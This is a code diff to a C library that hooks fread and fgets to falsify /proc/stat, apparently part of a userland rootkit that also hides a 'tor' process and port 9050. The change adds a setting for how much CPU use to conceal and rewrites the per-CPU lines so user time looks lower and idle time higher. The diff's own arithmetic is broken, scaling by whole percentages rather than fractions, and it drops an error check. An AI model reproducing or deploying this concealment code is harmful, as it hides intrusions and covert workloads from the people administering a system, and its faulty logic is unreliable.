@@ -38,6 +38,12 @@ static const char *process_to_filter_2 = "tor";
 static const int port_to_hide = 9050;
 
 /**
+ * CPU usage to hide
+ * [0, 100]
+ */
+static const int cpu_usage_to_hide = 25;
+
+/**
  * ======================================================================
  *                          HELPER FUNCTIONS
  * ======================================================================
@@ -277,27 +283,32 @@ size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
     // Debug information
     size_t ret = old_fread(ptr, size, nmemb, stream);
 
+    // Get file descriptor
     int fd = fileno(stream);
-    if (fd == -1)
-    {
-        return 0;
-    }
 
-    char tmp[64];
-    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
+    // Get file path
+    // Get the real path name of the file
+    struct stat inode;
+    fstat(fd, &inode);
 
+    // Get the path of the file
     char path[PATH_MAX];
-    ssize_t len = readlink(tmp, path, sizeof(path) - 1);
+    char proc[PATH_MAX];
 
-    if (len == -1)
+    sprintf(proc, "/proc/self/fd/%d", fd);
+
+    // Get the real path
+    ssize_t len = readlink(proc, path, sizeof(path) - 1);
+
+    if (len != -1)
     {
-        return 0;
+        path[len] = '\0';
     }
 
-    // Use string starting as I could not get to match exact path
-    // There seems to be some non printable characters in the final
-    // part of the path
-    if (strstr(path, "/proc/stat") == path)
+    // Check we are reading the /proc/stat file
+    // The same as before, we check the first part of the path
+    // as there seems to be some non printable characters at the end
+    if (strcmp(path, "/proc/stat") == 0)
     {
         char *line;
 
@@ -330,9 +341,9 @@ size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
                     exit(1);
                 }
 
-                // Take only the 25% of user time and sum it to the idle time
-                int new_idle = idle + (user * 0.75);
-                int new_user = user * 0.25;
+                // Take user time and sum it to the idle time
+                int new_idle = idle + (user * (100 - cpu_usage_to_hide));
+                int new_user = user * cpu_usage_to_hide;
 
                 // Write back to buffer
                 // Create new buffer with first line modifed and rest of the buffer
@@ -420,9 +431,9 @@ char *fgets(char *s, int size, FILE *stream)
             int user, nice, system, idle, iowait, irq, softirq, steal, guest, guest_nice;
             sscanf(s, "cpu %d %d %d %d %d %d %d %d %d %d", &user, &nice, &system, &idle, &iowait, &irq, &softirq, &steal, &guest, &guest_nice);
 
-            // Take only the 25% of user time and sum it to the idle time
-            int new_idle = idle + (user * 0.75);
-            int new_user = user * 0.25;
+            // Take user time and sum it to the idle time
+            int new_idle = idle + (user * (100 - cpu_usage_to_hide));
+            int new_user = user * cpu_usage_to_hide;
 
             // Create new line
             char new_line[256];
@@ -440,9 +451,9 @@ char *fgets(char *s, int size, FILE *stream)
 
             sscanf(s, "cpu%d %d %d %d %d %d %d %d %d %d", &cpu_num, &user, &nice, &system, &idle, &iowait, &irq, &softirq, &steal, &guest, &guest_nice);
 
-            // Take only the 25% of user time and sum it to the idle time
-            int new_idle = idle + (user * 0.75);
-            int new_user = user * 0.25;
+            // Take user time and sum it to the idle time
+            int new_idle = idle + (user * (100 - cpu_usage_to_hide));
+            int new_user = user * cpu_usage_to_hide;
 
             // Create new line
             char new_line[256];
@@ -451,9 +462,9 @@ char *fgets(char *s, int size, FILE *stream)
             // Copy new line to buffer
             memcpy(s, new_line, strlen(new_line));
         }
-
-        return ret;
     }
+
+    return ret;
 }
 
 /**
